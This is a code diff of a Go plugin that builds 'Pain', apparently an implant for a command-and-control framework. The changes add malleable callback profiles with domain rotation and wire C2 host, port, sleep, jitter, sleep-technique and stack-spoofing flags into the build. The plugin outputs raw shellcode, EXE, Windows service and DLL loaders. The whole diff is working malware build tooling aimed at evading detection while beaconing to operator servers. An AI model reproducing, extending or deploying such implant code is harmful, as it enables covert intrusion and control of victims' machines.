@@ -27,12 +27,14 @@ const (
 // key: 32-char lowercase hex string  →  value: int (AUTH_MODE_CMD or AUTH_MODE_OTK)
 var authKeys sync.Map
 
-// listenerConfig mirrors the listener plugin's ListenerConfig for JSON parsing
+// listenerConfig mirrors the listener plugin's ListenerConfig for JSON parsing.
+// Field names MUST match the json tags in listener_pain_http/src_server/pl_structs.go.
 type listenerConfig struct {
-	Host     string `json:"host"`
-	Port     int    `json:"port"`
-	AgentCrc string `json:"agent_crc"`
-	Ssl      bool   `json:"ssl"`
+	HostBind       string `json:"host_bind"`
+	PortBind       int    `json:"port_bind"`
+	Ssl            bool   `json:"ssl"`
+	ProfileContent string `json:"uploaded_file"`            // base64 of the uploaded C2 profile JSON
+	DomainRotation string `json:"domain_rotation_strategy"` // "Random"|"Round Robin"|"Failover"
 }
 
 // PainData holds Pain-specific fields that don't fit in the ax.AgentData
@@ -225,7 +227,7 @@ func (pa *PluginAgent) GenerateProfiles(profile ax.BuildProfile) ([][]byte, erro
 		if err := json.Unmarshal(lp.Profile, &cfg); err != nil {
 			continue
 		}
-		if cfg.Host == "" || cfg.Port == 0 {
+		if cfg.HostBind == "" || cfg.PortBind == 0 {
 			continue
 		}
 		b, _ := json.Marshal(cfg)
@@ -299,8 +301,31 @@ func (pa *PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]b
 	// 4. Compile agent shellcode with operator-supplied parameters.
 	// UUID is now generated at agent runtime - no PAIN_AGENT_UUID make variable.
 	// We still clean first so changing HOST/PORT/SLEEP flags force a full recompile.
-	fmt.Printf("[Pain] BuildPayload: compiling %s:%d ssl=%v sleep=%ds jitter=%d%%\n",
-		lp.Host, lp.Port, lp.Ssl, uiCfg.Sleep, uiCfg.Jitter)
+
+	// Build malleable profile blob for multi-callback / rotation support.
+	// Falls back to single-host legacy mode when no profile is uploaded.
+	malleableHex := "{0x00}"
+	callbackCount := 0
+	rotCode := 0
+
+	if lp.ProfileContent != "" {
+		profileBytes, decErr := base64.StdEncoding.DecodeString(lp.ProfileContent)
+		if decErr == nil {
+			blob, count, bErr := buildMalleableBytes(string(profileBytes), lp.DomainRotation, lp.Ssl)
+			if bErr == nil && count > 0 {
+				malleableHex = bytesToHexStr(blob)
+				callbackCount = count
+				rotCode = rotationCode(lp.DomainRotation)
+				fmt.Printf("[Pain] BuildPayload: malleable blob %d bytes, %d callbacks, rotation=%q\n",
+					len(blob), count, lp.DomainRotation)
+			} else if bErr != nil {
+				fmt.Printf("[Pain] BuildPayload: malleable build failed: %v - using legacy single host\n", bErr)
+			}
+		}
+	}
+
+	fmt.Printf("[Pain] BuildPayload: compiling %s:%d ssl=%v sleep=%ds jitter=%d%% callbacks=%d\n",
+		lp.HostBind, lp.PortBind, lp.Ssl, uiCfg.Sleep, uiCfg.Jitter, callbackCount)
 
 	sslFlag := 0
 	if lp.Ssl {
@@ -320,14 +345,17 @@ func (pa *PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]b
 	}
 
 	makeArgs := []string{
-		fmt.Sprintf("PAIN_C2_HOST=%s", lp.Host),
-		fmt.Sprintf("PAIN_C2_PORT=%d", lp.Port),
+		fmt.Sprintf("PAIN_C2_HOST=%s", lp.HostBind),
+		fmt.Sprintf("PAIN_C2_PORT=%d", lp.PortBind),
 		fmt.Sprintf("PAIN_SLEEP=%d", uiCfg.Sleep),
 		fmt.Sprintf("PAIN_JITTER=%d", uiCfg.Jitter),
 		fmt.Sprintf("PAIN_C2_SSL=%d", sslFlag),
 		fmt.Sprintf("PAIN_AUTH_MODE=%d", authMode),
 		fmt.Sprintf("PAIN_SLEEP_TECH=%d", sleepTech),
 		fmt.Sprintf("PAIN_STACK_SPOOF=%d", stackSpoof),
+		fmt.Sprintf("PAIN_MALLEABLE_BYTES=\"%s\"", malleableHex),
+		fmt.Sprintf("PAIN_CALLBACK_COUNT=%d", callbackCount),
+		fmt.Sprintf("PAIN_ROTATION=%d", rotCode),
 	}
 	if authKeyHex != "" {
 		makeArgs = append(makeArgs, fmt.Sprintf("PAIN_AUTH_KEY=%s", authKeyHex))
@@ -358,23 +386,23 @@ func (pa *PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]b
 	// 7. Shellcode-only format: skip loader build, return raw bytes directly.
 	if strings.HasPrefix(uiCfg.Format, "Shellcode") {
 		fmt.Printf("[Pain] BuildPayload: done - shellcode %d bytes for %s:%d\n",
-			len(shellcode), lp.Host, lp.Port)
+			len(shellcode), lp.HostBind, lp.PortBind)
 		return shellcode, "pain.x64.bin", nil
 	}
 
 	// 8. Determine which loader target to build and what file to return.
-	makeTarget := "loader.exe"
-	outFile := loaderSrc + "/loader.exe"
-	outName := "pain_loader.exe"
+	makeTarget := "Pain.x64.exe"
+	outFile := loaderSrc + "/Pain.x64.exe"
+	outName := "Pain.x64.exe"
 	switch {
 	case strings.HasPrefix(uiCfg.Format, "Service"):
-		makeTarget = "pain_svc.exe"
-		outFile = loaderSrc + "/pain_svc.exe"
-		outName = "pain_svc.exe"
+		makeTarget = "Pain.x64.svc.exe"
+		outFile = loaderSrc + "/Pain.x64.svc.exe"
+		outName = "Pain.x64.svc.exe"
 	case strings.HasPrefix(uiCfg.Format, "DLL"):
-		makeTarget = "pain.dll"
-		outFile = loaderSrc + "/pain.dll"
-		outName = "pain.dll"
+		makeTarget = "Pain.x64.dll"
+		outFile = loaderSrc + "/Pain.x64.dll"
+		outName = "Pain.x64.dll"
 	}
 
 	// Use -B to force rebuild even if timestamps haven't changed between builds.
@@ -390,7 +418,7 @@ func (pa *PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]b
 	}
 
 	fmt.Printf("[Pain] BuildPayload: done - %s %d bytes for %s:%d\n",
-		outName, len(loaderBytes), lp.Host, lp.Port)
+		outName, len(loaderBytes), lp.HostBind, lp.PortBind)
 
 	return loaderBytes, outName, nil
 }
